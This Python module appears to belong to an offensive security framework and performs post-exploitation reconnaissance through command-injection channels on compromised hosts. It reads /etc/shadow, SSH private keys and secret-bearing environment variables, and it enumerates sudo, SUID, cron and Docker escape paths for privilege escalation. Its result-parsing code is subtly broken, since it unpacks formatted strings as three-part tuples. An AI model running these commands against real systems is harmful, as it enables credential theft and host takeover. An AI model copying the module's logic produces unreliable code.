"""VAJRA post-exploitation — system situational awareness through every
established execution channel."""
from core.database import Finding

COMMANDS_UNIX = [
    ("identity", "id ; whoami"),
    ("system", "uname -a ; cat /etc/issue 2>/dev/null | head -2"),
    ("hostname-net", "hostname ; ip -brief a 2>/dev/null || ifconfig -a 2>/dev/null | head -20"),
    ("users-logins", "who ; w -h 2>/dev/null | head -5 ; last -5 2>/dev/null | head -5"),
    ("accounts", "(cat /etc/passwd ; cat /etc/shadow 2>/dev/null) | head -40"),
    ("privileges", "sudo -n -l 2>/dev/null | head -15 ; find / -perm -4000 -type f 2>/dev/null | head -15"),
    ("processes", "ps aux --sort=-%cpu 2>/dev/null | head -15"),
    ("cron-jobs", "crontab -l 2>/dev/null | head -15 ; ls -la /etc/cron* 2>/dev/null | head -20"),
    ("env-secrets", "env 2>/dev/null | grep -iE 'key|token|secret|pass' | head -10"),
    ("ssh-material", "ls -la ~/.ssh/ 2>/dev/null ; head -3 ~/.ssh/id_rsa 2>/dev/null"),
    ("docker-escape-hints", "ls -la /.dockerenv 2>/dev/null ; mount | head -10"),
]

COMMANDS_WIN = [
    ("identity", "whoami /all"),
    ("system", "systeminfo"),
    ("network", "ipconfig /all"),
    ("shares", "net share"),
    ("services", "sc query | head -40"),
]


def run(engine):
    channels = engine.state.get("channels", [])
    if not channels:
        return
    t = engine.target
    for idx, chan in enumerate(channels):
        cmds = COMMANDS_WIN if chan.kind == "windows" else COMMANDS_UNIX
        collected = []
        for label, cmd in cmds:
            try:
                out = chan.run(cmd)
            except Exception:
                out = None
            if out:
                collected.append("### %s\n$ %s\n%s" % (label, cmd, out[:2200]))
        if not collected:
            continue
        blob = "\n".join(c[2] for c in collected if len(c) > 2)
        privesc = []
        for label, cmd, out in collected:
            low_out = out.lower()
            if label == "privileges":
                for ln in out.splitlines():
                    if "nopasswd" in ln.lower():
                        privesc.append("sudo NOPASSWD -> " + ln.strip()[:120])
                    if "/usr/bin/find" in ln or "/usr/bin/vim" in ln                             or "/usr/bin/python" in ln:
                        privesc.append("SUID/GTFOBins candidate -> " +
                                       ln.strip()[:120])
                if "(docker)" in low_out:
                    privesc.append("docker group membership -> host escape")
            if label == "processes" and "docker.sock" in low_out:
                privesc.append("docker.sock mounted -> container escape")
            if label == "cron-jobs" and "/tmp/" in out:
                privesc.append("writable cron target under /tmp")
            if label == "accounts" and out.count(":") > 20:
                pass
        if privesc:
            engine.db.add_finding(Finding(
                t.display, "post.recon", "post-exploit", "critical",
                "LOCAL PRIVILEGE-ESCALATION CANDIDATES identified post-exploit"
                " (%d)" % len(privesc),
                detail="Channel output analysis surfaced escalation paths.",
                evidence="\n".join(privesc)[:3000], confidence="firm"))
        evidence = "\n\n".join(collected)[:14000]
        try:
            ev_rel = engine.save_evidence(
                "post_ex_channel%d.txt" % (idx + 1), evidence)
        except Exception:
            ev_rel = ""
        engine.db.add_finding(Finding(
            t.display, "post.recon", "post-exploit", "critical",
            "POST-EXPLOITATION RECON EXECUTED on target (%d intel categories)"
            % len(collected),
            detail="Executed through confirmed command-injection channel #%d "
                   "(%s).%s Full transcript in evidence block."
                   % (idx + 1, chan.kind,
                      (" Saved to " + ev_rel) if ev_rel else ""),
            evidence=evidence,
            remediation="Host compromise must be assumed: forensics, credential "
                        "rotation, rebuild from known-good images.",
            confidence="firm"))
        engine.log.finding("[post] %d category(ies) harvested via channel %d"
                           % (len(collected), idx + 1))
